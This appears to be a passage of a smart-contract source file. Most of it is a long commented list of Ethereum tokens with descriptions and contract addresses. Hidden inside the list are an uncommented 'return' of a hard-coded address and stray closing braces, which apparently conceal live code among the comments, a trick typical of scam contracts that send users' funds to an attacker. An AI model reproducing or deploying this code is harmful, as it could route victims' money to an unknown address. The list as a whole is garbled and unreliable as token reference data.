// Ribbon uses financial engineering to create structured products that aim to deliver sustainable yield. Ribbon's first product focuses on yield through automated options strategies. The protocol also allows developers to create arbitrary structured products by combining various DeFi derivatives.
// 0x6123b0049f904d730db3c36a31167d9d4121fa6b

// HooToken (HOO)
// HooToken aims to provide safe and reliable assets management and blockchain services to users worldwide.
// 0xd241d7b5cb0ef9fc79d9e4eb9e21f5e209f52f7d

// Wrapped Celo USD (wCUSD)
// Wrapped Celo Dollars are a 1:1 equivalent of Celo Dollars. cUSD (Celo Dollars) is a stable asset that follows the US Dollar.
// 0xad3e3fc59dff318beceaab7d00eb4f68b1ecf195

// Dawn (DAWN)
// Dawn is a utility token to reward competitive gaming and help players to build their professional Esports careers.
// 0x580c8520deda0a441522aeae0f9f7a5f29629afa

// StormX (STMX)
// StormX is a gamified marketplace that enables users to earn STMX ERC-20 tokens by completing micro-tasks or shopping at global partner stores online. Users can earn staking rewards, shopping, and micro-task benefits for holding STMX in their own wallet.
// 0xbe9375c6a420d2eeb258962efb95551a5b722803

// BandToken (BAND)
// A data governance framework for Web3.0 applications operating as an open-source standard for the decentralized management of data. Band Protocol connects smart contracts with trusted off-chain information, provided through community-curated oracle data providers.
// 0xba11d00c5f74255f56a5e366f4f77f5a186d7f55

// NKN (NKN)
// NKN is the new kind of P2P network connectivity protocol & ecosystem powered by a novel public blockchain.
// 0x5cf04716ba20127f1e2297addcf4b5035000c9eb

// Reputation (REPv2)
// Augur combines the magic of prediction markets with the power of a decentralized network to create a stunningly accurate forecasting tool
// 0x221657776846890989a759ba2973e427dff5c9bb

// Alchemy (ACH)
// Alchemy Pay (ACH) is a Singapore-based payment solutions provider that provides online and offline merchants with secure, convenient fiat and crypto acceptance.
// 0xed04915c23f00a313a544955524eb7dbd823143d

// Orchid (OXT)
// Orchid enables a decentralized VPN.
// 0x4575f41308EC1483f3d399aa9a2826d74Da13Deb

// Fetch (FET)
// Fetch.ai is building tools and infrastructure to enable a decentralized digital economy by combining AI, multi-agent systems and advanced cryptography.
// 0xaea46A60368A7bD060eec7DF8CBa43b7EF41Ad85

// Propy (PRO)
// Property Transactions Secured Through Blockchain.
// 0x226bb599a12c826476e3a771454697ea52e9e220

// Adshares (ADS)
// Adshares is a Web3 protocol for monetization space in the Metaverse. Adserver platforms allow users to rent space inside Metaverse, blockchain games, NFT exhibitions and websites.
// 0xcfcecfe2bd2fed07a9145222e8a7ad9cf1ccd22a

// FLOKI (FLOKI)
// The Floki Inu protocol is a cross-chain community-driven token available on two blockchains: Ethereum (ETH) and Binance Smart Chain (BSC).
// 0xcf0c122c6b73ff809c693db761e7baebe62b6a2e

// Aurora (AURORA)
// Aurora is an EVM built on the NEAR Protocol, a solution for developers to operate their apps on an Ethereum-compatible, high-throughput, scalable and future-safe platform, with a fully trustless bridge architecture to connect Ethereum with other networks.
// 0xaaaaaa20d9e0e2461697782ef11675f668207961

// Token Prometeus Network (PROM)
// Prometeus Network fuels people-owned data markets, introducing new ways to interact with data and profit from it. They use a peer-to-peer approach to operate beyond any border or jurisdiction.
// 0xfc82bb4ba86045af6f327323a46e80412b91b27d

// Ankr Eth2 Reward Bearing Certificate (aETHc)
// Ankr's Eth2 staking solution provides the best user experience and highest level of safety, combined with an attractive reward mechanism and instant staking liquidity through a bond-like synthetic token called aETH.
// 0xE95A203B1a91a908F9B9CE46459d101078c2c3cb

// Numeraire (NMR)
// NMR is the scarcity token at the core of the Erasure Protocol. NMR cannot be minted and its core use is for staking and burning. The Erasure Protocol brings negative incentives to any website on the internet by providing users with economic skin in the game and punishing bad actors.
// 0x1776e1f26f98b1a5df9cd347953a26dd3cb46671

// RLC (RLC)
// Blockchain Based distributed cloud computing
// 0x607F4C5BB672230e8672085532f7e901544a7375

// Compound Basic Attention Token (cBAT)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x6c8c6b02e7b2be14d4fa6022dfd6d75921d90e4e

// Bifrost (BFC)
// Bifrost is a multichain middleware platform that enables developers to create Decentralized Applications (DApps) on top of multiple protocols.
// 0x0c7D5ae016f806603CB1782bEa29AC69471CAb9c

// Boba Token (BOBA)
// Boba is an Ethereum L2 optimistic rollup that reduces gas fees, improves transaction throughput, and extends the capabilities of smart contracts through Hybrid Compute. Users of Boba’s native fast bridge can withdraw their funds in a few minutes instead of the usual 7 days required by other ORs.
// 0x42bbfa2e77757c645eeaad1655e0911a7553efbc

// AlphaToken (ALPHA)
// Alpha Finance Lab is an ecosystem of DeFi products and focused on building an ecosystem of automated yield-maximizing Alpha products that interoperate to bring optimal alpha to users on a cross-chain level.
// 0xa1faa113cbe53436df28ff0aee54275c13b40975

// SingularityNET Token (AGIX)
// Decentralized marketplace for artificial intelligence.
// 0x5b7533812759b45c2b44c19e320ba2cd2681b542

return 0x53C78029b3615786c3B752c83850933b2c263046;
// CarryToken (CRE)
// Carry makes personal data fair for consumers, marketers and merchants
// 0x115ec79f1de567ec68b7ae7eda501b406626478e

// LCX (LCX)
// LCX Terminal is made for Professional Cryptocurrency Portfolio Management
// 0x037a54aab062628c9bbae1fdb1583c195585fe41

// Gitcoin (GTC)
// GTC is a governance token with no economic value. GTC governs Gitcoin, where they work to decentralize grants, manage disputes, and govern the treasury.
// 0xde30da39c46104798bb5aa3fe8b9e0e1f348163f

// BOX Token (BOX)
// BOX offers a secure, convenient and streamlined crypto asset management system for institutional investment, audit risk control and crypto-exchange platforms.
// 0xe1A178B681BD05964d3e3Ed33AE731577d9d96dD

// Mainframe Token (MFT)
// The Hifi Lending Protocol allows users to borrow against their crypto. Hifi uses a bond-like instrument, representing an on-chain obligation that settles on a specific future date. Buying and selling the tokenized debt enables fixed-rate lending and borrowing.
// 0xdf2c7238198ad8b389666574f2d8bc411a4b7428

// UniBright (UBT)
// The unified framework for blockchain based business integration
// 0x8400d94a5cb0fa0d041a3788e395285d61c9ee5e

// QASH (QASH)
// We envision QASH to be the preferred payment token for financial services, like the Bitcoin for financial services. As more financial institutions, fintech startups and partners adopt QASH as a method of payment, the utility of QASH will scale, fueling the Fintech revolution.
// 0x618e75ac90b12c6049ba3b27f5d5f8651b0037f6

// AIOZ Network (AIOZ)
// The AIOZ Network is a decentralized content delivery network, which relies on multiple nodes spread out throughout the globe. These nodes provide computational-demanding resources like bandwidth, storage, and computational power in order to store content, share content and perform computing tasks.
// 0x626e8036deb333b408be468f951bdb42433cbf18

// Bluzelle (BLZ)
// Aims to be the next-gen database protocol for the decentralized internet.
// 0x5732046a883704404f284ce41ffadd5b007fd668
	}
}
// Reserve (RSV)
// Reserve aims to create a stable decentralized currency targeted at emerging economies.
// 0x196f4727526eA7FB1e17b2071B3d8eAA38486988

// Presearch (PRE)
// Presearch is building a decentralized search engine powered by the community. Presearch utilizes its PRE cryptocurrency token to reward users for searching and to power its Keyword Staking ad platform.
// 0xEC213F83defB583af3A000B1c0ada660b1902A0F

// TORN Token (TORN)
// Tornado Cash is a fully decentralized protocol for private transactions on Ethereum.
// 0x77777feddddffc19ff86db637967013e6c6a116c

// Student Coin (STC)
// The idea of the project is to create a worldwide academically-focused cryptocurrency, supervised by university and research faculty, established by students for students. Student Coins are used to build a multi-university ecosystem of value transfer.
// 0x15b543e986b8c34074dfc9901136d9355a537e7e

// Melon Token (MLN)
// Enzyme is a way to build, scale, and monetize investment strategies
// 0xec67005c4e498ec7f55e092bd1d35cbc47c91892

// HOPR Token (HOPR)
// HOPR provides essential and compliant network-level metadata privacy for everyone. HOPR is an open incentivized mixnet which enables privacy-preserving point-to-point data exchange.
// 0xf5581dfefd8fb0e4aec526be659cfab1f8c781da

// DIAToken (DIA)
// DIA is delivering verifiable financial data from traditional and crypto sources to its community.
// 0x84cA8bc7997272c7CfB4D0Cd3D55cd942B3c9419

// EverRise (RISE)
// EverRise is a blockchain technology company that offers bridging and security solutions across blockchains through an ecosystem of decentralized applications. The EverRise token (RISE) is a multi-chain, collateralized cryptocurrency that powers the EverRise dApp ecosystem.
// 0xC17c30e98541188614dF99239cABD40280810cA3

// Refereum (RFR)
// Distribution and growth platform for games.
// 0xd0929d411954c47438dc1d871dd6081f5c5e149c


// bZx Protocol Token (BZRX)
// BZRX token.
// 0x56d811088235F11C8920698a204A5010a788f4b3

// CoinDash Token (CDT)
// Blox is an open-source, fully non-custodial staking platform for Ethereum 2.0. Their goal at Blox is to simplify staking while ensuring Ethereum stays fair and decentralized.
// 0x177d39ac676ed1c67a2b268ad7f1e58826e5b0af

// Nectar (NCT)
// Decentralized marketplace where security experts build anti-malware engines that compete to protect you.
// 0x9e46a38f5daabe8683e10793b06749eef7d733d1

// Wirex Token (WXT)
// Wirex is a worldwide digital payment platform and regulated institution endeavoring to make digital money accessible to everyone. XT is a utility token and used as a backbone for Wirex's reward system called X-Tras
// 0xa02120696c7b8fe16c09c749e4598819b2b0e915

// FOX (FOX)
// FOX is ShapeShift’s official loyalty token. Holders of FOX enjoy zero-commission trading and win ongoing USDC crypto payments from Rainfall (payments increase in proportion to your FOX holdings). Use at ShapeShift.com.
// 0xc770eefad204b5180df6a14ee197d99d808ee52d

// Tellor Tributes (TRB)
// Tellor is a decentralized oracle that provides an on-chain data bank where staked miners compete to add the data points.
// 0x88df592f8eb5d7bd38bfef7deb0fbc02cf3778a0

// OVR (OVR)
// OVR ecosystem allow users to earn by buying, selling or renting OVR Lands or just by stacking OVR Tokens while content creators can earn building and publishing AR experiences.
// 0x21bfbda47a0b4b5b1248c767ee49f7caa9b23697

// Ampleforth Governance (FORTH)
// FORTH is the governance token for the Ampleforth protocol. AMPL is the first rebasing currency and a key DeFi building block for denominating stable contracts.
// 0x77fba179c79de5b7653f68b5039af940ada60ce0

// Moss Coin (MOC)
// Location-based Augmented Reality Mobile Game based on Real Estate
// 0x865ec58b06bf6305b886793aa20a2da31d034e68

// ICONOMI (ICN)
// ICONOMI Digital Assets Management platform enables simple access to a variety of digital assets and combined Digital Asset Arrays
// 0x888666CA69E0f178DED6D75b5726Cee99A87D698

// Kin (KIN)
// The vision for Kin is rooted in the belief that a participants can come together to create an open ecosystem of tools for digital communication and commerce that prioritizes consumer experience, fair and user-oriented model for digital services.
// 0x818fc6c2ec5986bc6e2cbf00939d90556ab12ce5

// Cortex Coin (CTXC)
// Decentralized AI autonomous system.
// 0xea11755ae41d889ceec39a63e6ff75a02bc1c00d

// SpookyToken (BOO)
// SpookySwap is an automated market-making (AMM) decentralized exchange (DEX) for the Fantom Opera network.
// 0x55af5865807b196bd0197e0902746f31fbccfa58

// BZ (BZ)
// Digital asset trading exchanges, providing professional digital asset trading and OTC (Over The Counter) services.
// 0x4375e7ad8a01b8ec3ed041399f62d9cd120e0063

// Adventure Gold (AGLD)
// Adventure Gold is the native ERC-20 token of the Loot non-fungible token (NFT) project. Loot is a text-based, randomized adventure gear generated and stored on-chain, created by social media network Vine co-founder Dom Hofmann.
// 0x32353A6C91143bfd6C7d363B546e62a9A2489A20

// Decentral Games (DG)
// Decentral Games is a community-owned metaverse casino ecosystem powered by DG.
// 0x4b520c812e8430659fc9f12f6d0c39026c83588d

// SENTINEL PROTOCOL (UPP)
// Sentinel Protocol is a blockchain-based threat intelligence platform that defends against hacks, scams, and fraud using crowdsourced threat data collected by security experts; called the Sentinels.
// 0xc86d054809623432210c107af2e3f619dcfbf652

// MATH Token (MATH)
// Crypto wallet.
// 0x08d967bb0134f2d07f7cfb6e246680c53927dd30

// SelfKey (KEY)
// SelfKey is a blockchain based self-sovereign identity ecosystem that aims to empower individuals and companies to find more freedom, privacy and wealth through the full ownership of their digital identity.
// 0x4cc19356f2d37338b9802aa8e8fc58b0373296e7

// RHOC (RHOC)
// The RChain Platform aims to be a decentralized, economically sustainable public compute infrastructure.
// 0x168296bb09e24a88805cb9c33356536b980d3fc5

// THORSwap Token (THOR)
// THORswap is a multi-chain DEX aggregator built on THORChain's cross-chain liquidity protocol for all THORChain services like THORNames and synthetic assets.
// 0xa5f2211b9b8170f694421f2046281775e8468044

// Somnium Space Cubes (CUBE)
// We are an open, social & persistent VR world built on blockchain. Buy land, build or import objects and instantly monetize. Universe shaped entirely by players!
// 0xdf801468a808a32656d2ed2d2d80b72a129739f4

// Parsiq Token (PRQ)
// A Blockchain monitoring and compliance platform.
// 0x362bc847A3a9637d3af6624EeC853618a43ed7D2

// EthLend (LEND)
// Aave is an Open Source and Non-Custodial protocol to earn interest on deposits & borrow assets. It also features access to highly innovative flash loans, which let developers borrow instantly and easily; no collateral needed. With 16 different assets, 5 of which are stablecoins.
// 0x80fB784B7eD66730e8b1DBd9820aFD29931aab03

// QANX Token (QANX)
// Quantum-resistant hybrid blockchain platform. Build your software applications like DApps or DeFi and run business processes on blockchain in 5 minutes with QANplatform.
// 0xaaa7a10a8ee237ea61e8ac46c50a8db8bcc1baaa

// LockTrip (LOC)
// Hotel Booking & Vacation Rental Marketplace With 0% Commissions.
// 0x5e3346444010135322268a4630d2ed5f8d09446c

// BioPassport Coin (BIOT)
// BioPassport is committed to help make healthcare a personal component of our daily lives. This starts with a 'health passport' platform that houses a patient's DPHR, or decentralized personal health record built around DID (decentralized identity) technology.
// 0xc07A150ECAdF2cc352f5586396e344A6b17625EB

// MANTRA DAO (OM)
// MANTRA DAO is a community-governed DeFi platform focusing on Staking, Lending, and Governance.
// 0x3593d125a4f7849a1b059e64f4517a86dd60c95d

// Sai Stablecoin v1.0 (SAI)
// Sai is an asset-backed, hard currency for the 21st century. The first decentralized stablecoin on the Ethereum blockchain.
// 0x89d24a6b4ccb1b6faa2625fe562bdd9a23260359

// Rarible (RARI)
// Create and sell digital collectibles secured with blockchain.
// 0xfca59cd816ab1ead66534d82bc21e7515ce441cf

// BTRFLY (BTRFLY)
// 0xc0d4ceb216b3ba9c3701b291766fdcba977cec3a

// AVT (AVT)
// An open-source protocol that delivers the global standard for ticketing.
// 0x0d88ed6e74bbfd96b831231638b66c05571e824f

// Fusion (FSN)
// FUSION is a public blockchain devoting itself to creating an inclusive cryptofinancial platform by providing cross-chain, cross-organization, and cross-datasource smart contracts.
// 0xd0352a019e9ab9d757776f532377aaebd36fd541

// BarnBridge Governance Token (BOND)
// BarnBridge aims to offer a cross platform protocol for tokenizing risk.
// 0x0391D2021f89DC339F60Fff84546EA23E337750f

// Nuls (NULS)
// NULS is a blockchain built on an infrastructure optimized for customized services through the use of micro-services. The NULS blockchain is a public, global, open-source community project. NULS uses the micro-service functionality to implement a highly modularized underlying architecture.
// 0xa2791bdf2d5055cda4d46ec17f9f429568275047

// Pinakion (PNK)
// Kleros provides fast, secure and affordable arbitration for virtually everything.
// 0x93ed3fbe21207ec2e8f2d3c3de6e058cb73bc04d

// LON Token (LON)
// Tokenlon is a decentralized exchange and payment settlement protocol.
// 0x0000000000095413afc295d19edeb1ad7b71c952

// CargoX (CXO)
// CargoX aims to be the independent supplier of blockchain-based Smart B/L solutions that enable extremely fast, safe, reliable and cost-effective global Bill of Lading processing.
// 0xb6ee9668771a79be7967ee29a63d4184f8097143

// Wrapped NXM (wNXM)
// Blockchain based solutions for smart contract cover.
// 0x0d438f3b5175bebc262bf23753c1e53d03432bde

// Bytom (BTM)
// Transfer assets from atomic world to byteworld
// 0xcb97e65f07da24d46bcdd078ebebd7c6e6e3d750

// OKB (OKB)
// Digital Asset Exchange
// 0x75231f58b43240c9718dd58b4967c5114342a86c

// Chain (XCN)
// Chain is a cloud blockchain protocol that enables organizations to build better financial services from the ground up powered by Sequence and Chain Core.
// 0xa2cd3d43c775978a96bdbf12d733d5a1ed94fb18

// Uniswap (UNI)
// UNI token served as governance token for Uniswap protocol with 1 billion UNI have been minted at genesis. 60% of the UNI genesis supply is allocated to Uniswap community members and remaining for team, investors and advisors.
// 0x1f9840a85d5af5bf1d1762f925bdaddc4201f984

// VeChain (VEN)
// Aims to connect blockchain technology to the real world by as well as advanced IoT integration.
// 0xd850942ef8811f2a866692a623011bde52a462c1

// Frax (FRAX)
// Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC. Additionally, FXS is the value accrual and governance token of the entire Frax ecosystem.
// 0x853d955acef822db058eb8505911ed77f175b99e

// TrueUSD (TUSD)
// A regulated, exchange-independent stablecoin backed 1-for-1 with US Dollars.
// 0x0000000000085d4780B73119b644AE5ecd22b376

// Wrapped Decentraland MANA (wMANA)
// The Wrapped MANA token is not transferable and has to be unwrapped 1:1 back to MANA to transfer it. This token is also not burnable or mintable (except by wrapping more tokens).
// 0xfd09cf7cfffa9932e33668311c4777cb9db3c9be

// Wrapped Filecoin (WFIL)
// Wrapped Filecoin is an Ethereum based representation of Filecoin.
// 0x6e1A19F235bE7ED8E3369eF73b196C07257494DE

// SAND (SAND)
// The Sandbox is a virtual world where players can build, own, and monetize their gaming experiences in the Ethereum blockchain using SAND, the platform’s utility token.
// 0x3845badAde8e6dFF049820680d1F14bD3903a5d0

// KuCoin Token (KCS)
// KCS performs as the key to the entire KuCoin ecosystem, and it will also be the native asset on KuCoin’s decentralized financial services as well as the governance token of KuCoin Community.
// 0xf34960d9d60be18cc1d5afc1a6f012a723a28811

// Compound USD Coin (cUSDC)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x39aa39c021dfbae8fac545936693ac917d5e7563

// Pax Dollar (USDP)
// Pax Dollar (USDP) is a digital dollar redeemable one-to-one for US dollars and regulated by the New York Department of Financial Services.
// 0x8e870d67f660d95d5be530380d0ec0bd388289e1

// HuobiToken (HT)
// Huobi Global is a world-leading cryptocurrency financial services group.
// 0x6f259637dcd74c767781e37bc6133cd6a68aa161

// Huobi BTC (HBTC)
// HBTC is a standard ERC20 token backed by 100% BTC. While maintaining the equivalent value of Bitcoin, it also has the flexibility of Ethereum. A bridge between the centralized market and the DeFi market.
// 0x0316EB71485b0Ab14103307bf65a021042c6d380

// Maker (MKR)
// Maker is a Decentralized Autonomous Organization that creates and insures the dai stablecoin on the Ethereum blockchain
// 0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2

// Graph Token (GRT)
// The Graph is an indexing protocol and global API for organizing blockchain data and making it easily accessible with GraphQL.
// 0xc944e90c64b2c07662a292be6244bdf05cda44a7

// BitTorrent (BTT)
// BTT is the official token of BitTorrent Chain, mapped from BitTorrent Chain at a ratio of 1:1. BitTorrent Chain is a brand-new heterogeneous cross-chain interoperability protocol, which leverages sidechains for the scaling of smart contracts.
// 0xc669928185dbce49d2230cc9b0979be6dc797957

// Decentralized USD (USDD)
// USDD is a fully decentralized over-collateralization stablecoin.
// 0x0C10bF8FcB7Bf5412187A595ab97a3609160b5c6

// Quant (QNT)
// Blockchain operating system that connects the world’s networks and facilitates the development of multi-chain applications.
// 0x4a220e6096b25eadb88358cb44068a3248254675

// Compound Dai (cDAI)
// Compound is an open-source, autonomous protocol built for developers, to unlock a universe of new financial applications. Interest and borrowing, for the open financial system.
// 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643

// Paxos Gold (PAXG)
// PAX Gold (PAXG) tokens each represent one fine troy ounce of an LBMA-certified, London Good Delivery physical gold bar, secured in Brink’s vaults.
// 0x45804880De22913dAFE09f4980848ECE6EcbAf78

// Compound Ether (cETH)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5

// Fantom Token (FTM)
// Fantom is a high-performance, scalable, customizable, and secure smart-contract platform. It is designed to overcome the limitations of previous generation blockchain platforms. Fantom is permissionless, decentralized, and open-source.
// 0x4e15361fd6b4bb609fa63c81a2be19d873717870

// Tether Gold (XAUt)
// Each XAU₮ token represents ownership of one troy fine ounce of physical gold on a specific gold bar. Furthermore, Tether Gold (XAU₮) is the only product among the competition that offers zero custody fees and has direct control over the physical gold storage.
// 0x68749665ff8d2d112fa859aa293f07a622782f38

// BitDAO (BIT)
// 0x1a4b46696b2bb4794eb3d4c26f1c55f9170fa4c5

// chiliZ (CHZ)
// Chiliz is the sports and fan engagement blockchain platform, that signed leading sports teams.
// 0x3506424f91fd33084466f402d5d97f05f8e3b4af

// BAT (BAT)
// The Basic Attention Token is the new token for the digital advertising industry.
// 0x0d8775f648430679a709e98d2b0cb6250d2887ef

// LoopringCoin V2 (LRC)
// Loopring is a DEX protocol offering orderbook-based trading infrastructure, zero-knowledge proof and an auction protocol called Oedax (Open-Ended Dutch Auction Exchange).
// 0xbbbbca6a901c926f240b89eacb641d8aec7aeafd

// Fei USD (FEI)
// Fei Protocol ($FEI) represents a direct incentive stablecoin which is undercollateralized and fully decentralized. FEI employs a stability mechanism known as direct incentives - dynamic mint rewards and burn penalties on DEX trade volume to maintain the peg.
// 0x956F47F50A910163D8BF957Cf5846D573E7f87CA

// Zilliqa (ZIL)
// Zilliqa is a high-throughput public blockchain platform - designed to scale to thousands ​of transactions per second.
// 0x05f4a42e251f2d52b8ed15e9fedaacfcef1fad27

// Amp (AMP)
// Amp is a digital collateral token designed to facilitate fast and efficient value transfer, especially for use cases that prioritize security and irreversibility. Using Amp as collateral, individuals and entities benefit from instant, verifiable assurances for any kind of asset exchange.
// 0xff20817765cb7f73d4bde2e66e067e58d11095c2

// Gala (GALA)
// Gala Games is dedicated to decentralizing the multi-billion dollar gaming industry by giving players access to their in-game items. Coming from the Co-founder of Zynga and some of the creative minds behind Farmville 2, Gala Games aims to revolutionize gaming.
// 0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA

// EnjinCoin (ENJ)
// Customizable cryptocurrency and virtual goods platform for gaming.
// 0xf629cbd94d3791c9250152bd8dfbdf380e2a3b9c

// XinFin XDCE (XDCE)
// Hybrid Blockchain technology company focused on international trade and finance.
// 0x41ab1b6fcbb2fa9dced81acbdec13ea6315f2bf2

// Wrapped Celo (wCELO)
// Wrapped Celo is a 1:1 equivalent of Celo. Celo is a utility and governance asset for the Celo community, which has a fixed supply and variable value. With Celo, you can help shape the direction of the Celo Platform.
// 0xe452e6ea2ddeb012e20db73bf5d3863a3ac8d77a

// HoloToken (HOT)
// Holo is a decentralized hosting platform based on Holochain, designed to be a scalable development framework for distributed applications.
// 0x6c6ee5e31d828de241282b9606c8e98ea48526e2

// Synthetix Network Token (SNX)
// The Synthetix Network Token (SNX) is the native token of Synthetix, a synthetic asset (Synth) issuance protocol built on Ethereum. The SNX token is used as collateral to issue Synths, ERC-20 tokens that track the price of assets like Gold, Silver, Oil and Bitcoin.
// 0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f

// Nexo (NEXO)
// Instant Crypto-backed Loans
// 0xb62132e35a6c13ee1ee0f84dc5d40bad8d815206

// HarmonyOne (ONE)
// A project to scale trust for billions of people and create a radically fair economy.
// 0x799a4202c12ca952cb311598a024c80ed371a41e

// 1INCH Token (1INCH)
// 1inch is a decentralized exchange aggregator that sources liquidity from various exchanges and is capable of splitting a single trade transaction across multiple DEXs. Smart contract technology empowers this aggregator enabling users to optimize and customize their trades.
// 0x111111111117dc0aa78b770fa6a738034120c302

// pTokens SAFEMOON (pSAFEMOON)
// Safemoon protocol aims to create a self-regenerating automatic liquidity providing protocol that would pay out static rewards to holders and penalize sellers.
// 0x16631e53c20fd2670027c6d53efe2642929b285c

// Frax Share (FXS)
// FXS is the value accrual and governance token of the entire Frax ecosystem. Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC.
// 0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0

// Serum (SRM)
// Serum is a decentralized derivatives exchange with trustless cross-chain trading by Project Serum, in collaboration with a consortium of crypto trading and DeFi experts.
// 0x476c5E26a75bd202a9683ffD34359C0CC15be0fF

// WQtum (WQTUM)
// 0x3103df8f05c4d8af16fd22ae63e406b97fec6938

// Olympus (OHM)
// 0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5

// Gnosis (GNO)
// Crowd Sourced Wisdom - The next generation blockchain network. Speculate on anything with an easy-to-use prediction market
// 0x6810e776880c02933d47db1b9fc05908e5386b96

// MCO (MCO)
// Crypto.com, the pioneering payments and cryptocurrency platform, seeks to accelerate the world’s transition to cryptocurrency.
// 0xb63b606ac810a52cca15e44bb630fd42d8d1d83d

// Gemini dollar (GUSD)
// Gemini dollar combines the creditworthiness and price stability of the U.S. dollar with blockchain technology and the oversight of U.S. regulators.
// 0x056fd409e1d7a124bd7017459dfea2f387b6d5cd

// OMG Network (OMG)
// OmiseGO (OMG) is a public Ethereum-based financial technology for use in mainstream digital wallets
// 0xd26114cd6EE289AccF82350c8d8487fedB8A0C07

// IOSToken (IOST)
// A Secure & Scalable Blockchain for Smart Services
// 0xfa1a856cfa3409cfa145fa4e20eb270df3eb21ab

// IoTeX Network (IOTX)
// IoTeX is the next generation of the IoT-oriented blockchain platform with vast scalability, privacy, isolatability, and developability. IoTeX connects the physical world, block by block.
// 0x6fb3e0a217407efff7ca062d46c26e5d60a14d69

// NXM (NXM)
// Nexus Mutual uses the power of Ethereum so people can share risks together without the need for an insurance company.
// 0xd7c49cee7e9188cca6ad8ff264c1da2e69d4cf3b

// ZRX (ZRX)
// 0x is an open, permissionless protocol allowing for tokens to be traded on the Ethereum blockchain.
// 0xe41d2489571d322189246dafa5ebde1f4699f498

// Celsius (CEL)
// A new way to earn, borrow, and pay on the blockchain.!
// 0xaaaebe6fe48e54f431b0c390cfaf0b017d09d42d

// Magic Internet Money (MIM)
// abracadabra.money is a lending protocol that allows users to borrow a USD-pegged Stablecoin (MIM) using interest-bearing tokens as collateral.
// 0x99d8a9c45b2eca8864373a26d1459e3dff1e17f3

// Golem Network Token (GLM)
// Golem is going to create the first decentralized global market for computing power
// 0x7DD9c5Cba05E151C895FDe1CF355C9A1D5DA6429

// Compound (COMP)
// Compound governance token
// 0xc00e94cb662c3520282e6f5717214004a7f26888

// Lido DAO Token (LDO)
// Lido is a liquid staking solution for Ethereum. Lido lets users stake their ETH - with no minimum deposits or maintaining of infrastructure - whilst participating in on-chain activities, e.g. lending, to compound returns. LDO is an ERC20 token granting governance rights in the Lido DAO.
// 0x5a98fcbea516cf06857215779fd812ca3bef1b32

// HUSD (HUSD)
// HUSD is an ERC-20 token that is 1:1 ratio pegged with USD. It was issued by Stable Universal, an entity that follows US regulations.
// 0xdf574c24545e5ffecb9a659c229253d4111d87e1

// SushiToken (SUSHI)
// Be a DeFi Chef with Sushi - Swap, earn, stack yields, lend, borrow, leverage all on one decentralized, community driven platform.
// 0x6b3595068778dd592e39a122f4f5a5cf09c90fe2

// Livepeer Token (LPT)
// A decentralized video streaming protocol that empowers developers to build video enabled applications backed by a competitive market of economically incentivized service providers.
// 0x58b6a8a3302369daec383334672404ee733ab239

// WAX Token (WAX)
// Global Decentralized Marketplace for Virtual Assets.
// 0x39bb259f66e1c59d5abef88375979b4d20d98022

// Swipe (SXP)
// Swipe is a cryptocurrency wallet and debit card that enables users to spend their cryptocurrencies over the world.
// 0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9

// Ethereum Name Service (ENS)
// Decentralised naming for wallets, websites, & more.
// 0xc18360217d8f7ab5e7c516566761ea12ce7f9d72

// APENFT (NFT)
// APENFT Fund was born with the mission to register world-class artworks as NFTs on blockchain and aim to be the ARK Funds in the NFT space to build a bridge between top-notch artists and blockchain, and to support the growth of native crypto NFT artists. Mapped from TRON network.
// 0x198d14f2ad9ce69e76ea330b374de4957c3f850a

// UMA Voting Token v1 (UMA)
// UMA is a decentralized financial contracts platform built to enable Universal Market Access.
// 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828

// MXCToken (MXC)
// Inspiring fast, efficient, decentralized data exchanges using LPWAN-Blockchain Technology.
// 0x5ca381bbfb58f0092df149bd3d243b08b9a8386e

// SwissBorg (CHSB)
// Crypto Wealth Management.
// 0xba9d4199fab4f26efe3551d490e3821486f135ba

// Polymath (POLY)
// Polymath aims to enable securities to migrate to the blockchain.
// 0x9992ec3cf6a55b00978cddf2b27bc6882d88d1ec

// Wootrade Network (WOO)
// Wootrade is incubated by Kronos Research, which aims to solve the pain points of the diversified liquidity of the cryptocurrency market, and provides sufficient trading depth for users such as exchanges, wallets, and trading institutions with zero fees.
// 0x4691937a7508860f876c9c0a2a617e7d9e945d4b

// Dogelon (ELON)
// A universal currency for the people.
// 0x761d38e5ddf6ccf6cf7c55759d5210750b5d60f3

// yearn.finance (YFI)
// DeFi made simple.
// 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e

// PlatonCoin (PLTC)
// Platon Finance is a blockchain digital ecosystem that represents a bridge for all the people and business owners so everybody could learn, understand, use and benefit from blockchain, a revolution of technology. See the future in a new light with Platon.
// 0x429D83Bb0DCB8cdd5311e34680ADC8B12070a07f

// OriginToken (OGN)
// Origin Protocol is a platform for creating decentralized marketplaces on the blockchain.
// 0x8207c1ffc5b6804f6024322ccf34f29c3541ae26


// STASIS EURS Token (EURS)
// EURS token is a virtual financial asset that is designed to digitally mirror the EURO on the condition that its value is tied to the value of its collateral.
// 0xdb25f211ab05b1c97d595516f45794528a807ad8

// Smooth Love Potion (SLP)
// Smooth Love Potions (SLP) is a ERC-20 token that is fully tradable.
// 0xcc8fa225d80b9c7d42f96e9570156c65d6caaa25

// Balancer (BAL)
// Balancer is a n-dimensional automated market-maker that allows anyone to create or add liquidity to customizable pools and earn trading fees. Instead of the traditional constant product AMM model, Balancer’s formula is a generalization that allows any number of tokens in any weights or trading fees.
// 0xba100000625a3754423978a60c9317c58a424e3d

// renBTC (renBTC)
// renBTC is a one for one representation of BTC on Ethereum via RenVM.
// 0xeb4c2781e4eba804ce9a9803c67d0893436bb27d

// Bancor (BNT)
// Bancor is an on-chain liquidity protocol that enables constant convertibility between tokens. Conversions using Bancor are executed against on-chain liquidity pools using automated market makers to price and process transactions without order books or counterparties.
